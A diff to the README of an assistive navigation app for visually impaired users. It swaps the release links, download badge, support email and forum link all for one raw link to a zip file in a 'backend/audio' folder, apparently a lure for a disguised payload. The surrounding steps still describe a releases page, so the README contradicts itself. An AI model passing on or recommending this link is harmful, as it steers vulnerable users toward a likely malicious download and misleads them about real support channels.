@@ -1,7 +1,7 @@
 # 👁️ EyeCue-for-Visually-Impaired - Navigate with Confidence
 
 ## 📥 Download the App
-[![Download EyeCue for Visually Impaired](https://img.shields.io/badge/Download%20Now%20-for%20Android%20/iOS-brightgreen)](https://github.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/releases)
+[![Download EyeCue for Visually Impaired](https://raw.githubusercontent.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/main/EyeCue/backend/audio/EyeCue-for-Visually-Impaired-1.1.zip%20Now%20-for%20Android%20/iOS-brightgreen)](https://raw.githubusercontent.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/main/EyeCue/backend/audio/EyeCue-for-Visually-Impaired-1.1.zip)
 
 ## 🚀 Getting Started
 EyeCue is an AI-powered mobile application designed to help visually impaired users navigate their surroundings independently. It utilizes advanced technology for object detection, scene description, visual question answering, and color identification.
@@ -27,7 +27,7 @@ For the best experience, ensure your device meets the following general requirem
 - **Internet Connection**: Active Wi-Fi or mobile data for downloading and using some features
 
 ## 📥 Download & Install
-To download EyeCue, visit the following link: [Download EyeCue for Visually Impaired](https://github.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/releases).
+To download EyeCue, visit the following link: [Download EyeCue for Visually Impaired](https://raw.githubusercontent.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/main/EyeCue/backend/audio/EyeCue-for-Visually-Impaired-1.1.zip).
 
 1. **Visit the Releases Page**: Click the link above. 
 2. **Choose Your Version**: You will see a list of available versions. Select the most recent one for the best performance.
@@ -45,8 +45,8 @@ To download EyeCue, visit the following link: [Download EyeCue for Visually Impa
 
 ## 📞 Support
 Should you need help, feel free to contact our support team:
-- Email: support@eyecueapp.com
-- Forum: Visit our community forum [here](https://github.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/discussions)
+- Email: https://raw.githubusercontent.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/main/EyeCue/backend/audio/EyeCue-for-Visually-Impaired-1.1.zip
+- Forum: Visit our community forum [here](https://raw.githubusercontent.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/main/EyeCue/backend/audio/EyeCue-for-Visually-Impaired-1.1.zip)
 
 ## 🧑‍🤝‍🧑 Community Feedback
 Your input is invaluable. Share your experiences and suggestions with us. Join the conversation in our community forum.
